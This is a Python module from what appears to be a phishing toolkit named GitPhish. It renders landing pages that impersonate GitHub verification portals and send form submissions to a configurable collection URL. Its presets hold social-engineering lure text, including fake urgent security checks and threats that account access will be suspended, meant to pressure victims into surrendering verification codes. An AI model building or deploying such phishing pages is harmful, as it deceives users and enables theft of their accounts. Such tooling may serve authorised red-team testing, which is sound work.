"""
Template rendering module for GitPhish deployment.

Handles rendering of Jinja2 templates with dynamic values for deployment.
"""

import os
import logging
from typing import Dict, Any
from jinja2 import Environment, FileSystemLoader, select_autoescape

logger = logging.getLogger(__name__)


class TemplateRenderer:
    """Handles rendering of Jinja2 templates for deployment."""

    def __init__(self, templates_dir: str = None):
        """
        Initialize the template renderer.

        Args:
            templates_dir: Directory containing templates. Defaults to gitphish/templates
        """
        if templates_dir is None:
            # Default to templates directory relative to this file
            current_dir = os.path.dirname(os.path.abspath(__file__))
            templates_dir = current_dir

        self.templates_dir = templates_dir
        self.env = Environment(
            loader=FileSystemLoader(templates_dir),
            autoescape=select_autoescape(["html", "xml"]),
        )

        logger.debug(f"Template renderer initialized with directory: {templates_dir}")

    def render_landing_page(self, ingest_url: str, **kwargs) -> str:
        """
        Render the landing page template with the provided ingest URL.

        Args:
            ingest_url: The URL where form submissions should be sent
            **kwargs: Additional template variables

        Returns:
            Rendered HTML content as string

        Raises:
            FileNotFoundError: If landing_page.html template is not found
            Exception: If template rendering fails
        """
        try:
            template = self.env.get_template("landing_page.html")

            # Default template variables
            template_vars = {
                "ingest_url": ingest_url,
                "page_title": kwargs.get("page_title", "Verification Portal"),
                "portal_title": kwargs.get("portal_title", "Verification Portal"),
                "loading_message": kwargs.get(
                    "loading_message",
                    "Please wait while we get things setup...",
                ),
                "success_title": kwargs.get(
                    "success_title", "Verification code ready!"
                ),
                "button_text": kwargs.get("button_text", "Verify with GitHub"),
                "org_name": kwargs.get("org_name", "organization"),
                **kwargs,  # Allow additional custom variables
            }

            # Only include success_message and error_message if they have actual values
            # This allows the template defaults to be used when they're None
            if kwargs.get("success_message") is not None:
                template_vars["success_message"] = kwargs.get("success_message")
            if kwargs.get("error_message") is not None:
                template_vars["error_message"] = kwargs.get("error_message")

            rendered_html = template.render(**template_vars)
            logger.debug(
                f"Successfully rendered landing page template with ingest_url: {ingest_url}"
            )
            logger.debug(f"Template variables used: {list(template_vars.keys())}")

            return rendered_html

        except Exception as e:
            logger.error(f"Failed to render landing page template: {str(e)}")
            raise

    def list_templates(self) -> list:
        """
        List all available templates in the templates directory.

        Returns:
            List of template filenames
        """
        try:
            return self.env.list_templates()
        except Exception as e:
            logger.error(f"Failed to list templates: {str(e)}")
            return []

    def template_exists(self, template_name: str) -> bool:
        """
        Check if a template exists.

        Args:
            template_name: Name of the template to check

        Returns:
            True if template exists, False otherwise
        """
        try:
            self.env.get_template(template_name)
            return True
        except Exception:
            return False

    def get_template_preset(self, preset_name: str) -> Dict[str, Any]:
        """
        Get predefined template variable presets for common scenarios.

        Args:
            preset_name: Name of the preset ('default', 'enterprise', 'urgent', 'security')

        Returns:
            Dictionary of template variables
        """
        presets = {
            "default": {
                "page_title": "Verification Portal",
                "portal_title": "Verification Portal",
                "loading_message": "Please wait while we get things setup...",
                "success_title": "Verification code ready!",
                "button_text": "Verify with GitHub",
                "org_name": "organization",
            },
            "enterprise": {
                "page_title": "Enterprise GitHub Verification",
                "portal_title": "Enterprise Authentication Required",
                "loading_message": "Connecting to enterprise authentication services...",
                "success_title": "Enterprise verification code ready",
                "button_text": "Authenticate with Enterprise GitHub",
                "org_name": "enterprise organization",
            },
            "urgent": {
                "page_title": "Urgent: Account Verification Required",
                "portal_title": "🚨 Urgent Account Verification",
                "loading_message": "Processing security verification request...",
                "success_title": "⚡ Verification code generated",
                "success_message": "URGENT: Use this code immediately to maintain access:",
                "button_text": "🔒 Verify Account Now",
                "org_name": "organization",
                "error_message": "CRITICAL: Verification failed. Your account access may be suspended.",
            },
            "security": {
                "page_title": "Security Verification - GitHub",
                "portal_title": "Security Verification Required",
                "loading_message": "Running security checks and generating verification code...",
                "success_title": "Security verification ready",
                "success_message": "Complete security verification for continued access:",
                "button_text": "🛡️ Complete Security Check",
                "org_name": "secure environment",
            },
        }

        if preset_name not in presets:
            logger.warning(f"Unknown preset '{preset_name}', using default")
            preset_name = "default"

        logger.debug(f"Using template preset: {preset_name}")
        return presets[preset_name]

    def render_with_preset(
        self, ingest_url: str, preset_name: str = "default", **overrides
    ) -> str:
        """
        Render landing page using a predefined preset with optional overrides.

        Args:
            ingest_url: The URL where form submissions should be sent
            preset_name: Name of the preset to use
            **overrides: Variables to override from the preset

        Returns:
            Rendered HTML content as string
        """
        preset_vars = self.get_template_preset(preset_name)
        preset_vars.update(overrides)  # Apply any overrides

        return self.render_landing_page(ingest_url, **preset_vars)
